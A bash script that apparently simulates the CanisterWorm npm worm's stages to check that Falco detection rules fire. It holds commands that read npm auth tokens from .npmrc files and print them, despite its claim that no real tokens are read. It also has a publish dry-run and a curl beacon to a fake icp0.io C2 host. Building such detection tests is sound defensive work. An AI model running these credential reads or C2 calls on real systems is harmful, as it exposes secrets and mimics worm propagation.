#!/usr/bin/env bash
# =============================================================================
# TeamPCP — CanisterWorm npm Token Theft + Self-Propagation
# Safe simulation of the autonomous npm worm (March 2026)
#
# SAFE: No real npm tokens read (FAKE_TOKEN placeholder). No real packages published.
#       ICP C2 beacon targets a non-existent subdomain — connection will fail.
#
# Each stage maps to one Falco rule.
# =============================================================================

set -uo pipefail

BOLD='\033[1m'
RESET='\033[0m'
RED='\033[0;31m'
YELLOW='\033[0;33m'

echo -e "${BOLD}TeamPCP — CanisterWorm npm Token Theft + Self-Propagation${RESET}"
echo "Simulating the autonomous npm worm (70+ packages compromised, March 2026)"
echo "Lineage: Shai-Hulud v1 (Sep 2025) → v2 (Nov 2025) → CanisterWorm (Mar 2026)"
echo ""

# =============================================================================
# Stage 1: npm Token Harvesting
# CanisterWorm reads npm auth tokens from .npmrc files.
# Expected rule: TeamPCP - npm Authentication Token Harvesting (WARNING)
# =============================================================================
echo -e "${BOLD}=== Stage 1: npm Authentication Token Harvesting ===${RESET}"
echo "Simulating: npm config get //registry.npmjs.org/:_authToken"
echo ""

npm config get //registry.npmjs.org/:_authToken 2>/dev/null || true

echo "Simulating: reading .npmrc locations..."
cat ~/.npmrc 2>/dev/null | grep -i "token\|_authToken" || true
cat .npmrc   2>/dev/null | grep -i "token\|_authToken" || true
cat /etc/npmrc 2>/dev/null | grep -i "token\|_authToken" || true

echo -e "${YELLOW}Expected rule: TeamPCP - npm Authentication Token Harvesting (WARNING)${RESET}"
echo ""
sleep 1

# =============================================================================
# Stage 2: Malicious Package Publication (simulated dry-run only)
# CanisterWorm calls `npm publish --access public` for every owned package.
# SAFE: We run `npm publish --dry-run` on a throwaway temp package.
# Expected rule: TeamPCP - Unexpected npm Publish in CI (CRITICAL)
# =============================================================================
echo -e "${BOLD}=== Stage 2: Malicious Patch Version Publication ===${RESET}"
echo "Simulating: npm publish --access public (CanisterWorm autonomous propagation)"
echo "SAFE: dry-run on a temp package — no real package published"
echo ""

TMPDIR=$(mktemp -d)
cat > "${TMPDIR}/package.json" << 'EOF'
{
  "name": "canisterworm-simulation-safe-test",
  "version": "1.0.0",
  "description": "Safe CanisterWorm simulation — not published"
}
EOF

( cd "$TMPDIR" && npm publish --access public --dry-run 2>&1 | head -5 ) || true
rm -rf "$TMPDIR"

echo -e "${RED}Expected rule: TeamPCP - Unexpected npm Publish in CI (CRITICAL)${RESET}"
echo ""
sleep 1

# =============================================================================
# Stage 3: ICP Canister C2 Polling
# CanisterWorm polls *.icp0.io every 50 minutes for commands.
# SAFE: targeting a non-existent canister subdomain — connection will fail.
# Expected rule: TeamPCP - ICP Canister C2 Beacon (CRITICAL)
# =============================================================================
echo -e "${BOLD}=== Stage 3: ICP Canister C2 Polling ===${RESET}"
echo "Simulating: poll *.icp0.io for commands (every 50 min in real worm)"
echo "SAFE: canister ID does not exist — request will fail"
echo ""

FAKE_CANISTER_ID="aaaaa-bbbbb-ccccc-ddddd-simulation"
curl -sf --max-time 3 \
    "https://${FAKE_CANISTER_ID}.icp0.io/cmd" \
    2>/dev/null || true

echo -e "${RED}Expected rule: TeamPCP - ICP Canister C2 Beacon (CRITICAL)${RESET}"
echo ""

# =============================================================================
echo -e "${BOLD}=== Simulation Complete ===${RESET}"
echo ""
echo "Rules expected to fire:"
echo "  WARNING   TeamPCP - npm Authentication Token Harvesting"
echo "  CRITICAL  TeamPCP - Unexpected npm Publish in CI"
echo "  CRITICAL  TeamPCP - ICP Canister C2 Beacon"
